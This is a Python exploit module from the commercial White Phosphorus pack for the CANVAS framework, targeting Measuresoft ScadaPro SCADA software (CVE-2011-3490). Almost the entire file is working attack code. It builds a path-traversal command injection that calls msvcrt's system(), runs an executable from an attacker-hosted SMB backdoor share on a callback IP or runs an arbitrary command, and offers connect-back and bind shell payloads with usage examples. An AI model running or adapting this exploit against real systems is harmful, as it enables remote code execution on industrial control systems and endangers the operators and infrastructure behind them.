
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF import pelib
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from libs.canvasos import canvasos
import libs.spkproxy as spkproxy


######################################################################################
NAME = "Measuresoft ScadaPro Remote Code Execution"
DESCRIPTION = "Exploits a remote code execution vulnerability in Measuresoft ScadaPro"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Measuresoft'
DOCUMENTATION["Date public"] = "2011-09-13"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2011-3490"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-3490'
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["References"] = "http://aluigi.altervista.org/adv/scadapro_1-adv.txt"
DOCUMENTATION["Notes"] = """
All payloads are served over SMB via wp_smbserver_backdoor except 'Execute Command'. Windows based CANVAS users must first disable the native Windows SMB server before running the module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the system.

Instructions:
1. Disable native SMB server and reboot
2. Run wp_measuresoft_scadapro_xf
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "2000", "Vista", "7"]

NOTES="""
All payloads are served over SMB via wp_smbserver_backdoor except 'Execute Command'. Windows based CANVAS users must first disable the native Windows SMB server before running the module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the system.

Instructions:
1. Disable native SMB server and reboot
2. Run wp_measuresoft_scadapro_xf

WP> White Phosphorus Exploit Pack
WP> Measuresoft ScadaPro Remote Code Execution
----------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_measuresoft_scadapro_xf/wp_measuresoft_scadapro_xf.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 11234
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x0000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.ExecCmd = False
        self.vProtect = True
        self.useRawShellcode = True
        self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(8) ] ) + '.exe'
        self.sharefilename = "\\\\"+ "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + "\\\\" + self.payloadFilename
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = 'xf%..\..\..\..\..\windows\system32\msvcrt.dll,system,start '
        
        if self.ExecCmd:
            payload += self.execCMD
        else:
            self.log("WP> Filename: %s"%self.payloadFilename)
            payload += '\\\\' + self.callback.ip + self.sharefilename
        return payload

    def run(self):
        self.getArgs()
        
        try:
            if self.shell_EXECCMD:
                self.ExecCmd = True
        except:
            self.ExecCmd = False
        
        if not self.ExecCmd:
            self.log("WP> Starting wp_smbserver_backdoor to host Payload")
            try:
                app=self.engine.getModuleExploit("wp_smbserver_backdoor")
                app.link(self) # set arguments to modules arguments
                app.argsDict['sharefilename'] = self.sharefilename
                app.argsDict['trojanPayload'] = self.shellcode
                ret=app.run()
            except:
                self.log("WP> Unable to start wp_smbserver_backdoor - port 443 already bound?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return None,None        
            time.sleep(5)
            
        payload = self.makesploit()        
        self.result_error = 0
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(2)
            s.close()
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        time.sleep(3)
        
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
